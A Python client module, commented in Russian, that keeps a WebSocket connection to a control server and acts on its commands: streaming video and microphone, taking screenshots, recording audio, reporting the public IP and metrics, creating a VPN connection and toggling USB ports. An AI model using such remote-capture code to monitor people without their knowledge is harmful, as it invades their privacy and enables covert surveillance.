import json
import time
import threading
import websocket
from client.config import WS_URL
from client.logger_config import setup_logger
from client.services.metrics_service import get_init_info, collect_and_send_metrics
from client.services.screenshot_service import take_screenshot
from client.services.audio_service import record_audio_snippet
from client.system.sys_info import create_vpn_connection
from client.system.security import is_admin, enable_usb_ports, disable_usb_ports

logger = setup_logger()

ws_lock = threading.Lock()
ws_active = False

# Для управления состоянием видео и аудио, импортируем глобальные переменные из соответствующих модулей.
# Например, из video_service.py и audio_service.py:
from client.services.video_service import streaming_active
from client.services.audio_service import mic_streaming_active

def send_ip_via_ws(ws):
    try:
        import requests
        response = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip = response.json().get("ip")
        logger.info(f"Получен публичный IP: {ip}")
        ws.send("ip:" + ip)
    except Exception as e:
        logger.error("Ошибка получения или отправки публичного IP: " + str(e))

def on_message(ws, message):
    global mic_streaming_active, streaming_active
    logger.info(f"Получена команда: {message}")
    cmd = message.lower()
    if cmd == "stop":
        streaming_active = False
        logger.info("Видео трансляция остановлена командой сервера.")
    elif cmd == "start":
        streaming_active = True
        logger.info("Видео трансляция запущена командой сервера.")
    elif cmd == "send_ip":
        logger.info("Отправка данных по IP по команде сервера.")
        send_ip_via_ws(ws)
    elif cmd == "screenshot":
        take_screenshot()
    elif cmd == "metrics":
        collect_and_send_metrics(ws)
    elif cmd == "mic_start":
        mic_streaming_active = True
        logger.info("Трансляция микрофона запущена командой сервера.")
    elif cmd == "mic_stop":
        mic_streaming_active = False
        logger.info("Трансляция микрофона остановлена командой сервера.")
    elif cmd == "record_audio":
        logger.info("Запись аудио по команде сервера.")
        threading.Thread(target=record_audio_snippet, daemon=True).start()
    elif cmd == "vpn_create":
        logger.info("Создание VPN подключения по команде сервера.")
        threading.Thread(target=create_vpn_connection, daemon=True).start()
    elif cmd == "usb_on":
        logger.info(f"Проверка прав администратора: {is_admin()}")
        logger.info("Запрос на включение USB портов.")
        enable_usb_ports()
    elif cmd == "usb_off":
        logger.info(f"Проверка прав администратора: {is_admin()}")
        logger.info("Запрос на отключение USB портов.")
        disable_usb_ports()

def on_error(ws, error):
    logger.error("WebSocket ошибка: " + str(error))

def on_close(ws, close_status_code, close_msg):
    global ws_active
    with ws_lock:
        ws_active = False
    logger.info("WebSocket соединение закрыто")

def on_open(ws):
    global ws_active
    with ws_lock:
        ws_active = True
    logger.info("WebSocket соединение установлено")
    ws.send("Client connected")
    init_data = get_init_info()
    payload = {
        "command": "init_info",
        "data": init_data
    }
    ws.send(json.dumps(payload))
    logger.info("Отправлен init_info (ip + metrics).")

def control_ws():
    global ws_active
    while True:
        with ws_lock:
            active = ws_active
        if not active:
            try:
                ws = websocket.WebSocketApp(
                    WS_URL,
                    on_open=on_open,
                    on_message=on_message,
                    on_error=on_error,
                    on_close=on_close
                )
                ws.run_forever()
            except Exception as e:
                logger.error("Ошибка WebSocket подключения: " + str(e))
        time.sleep(5)
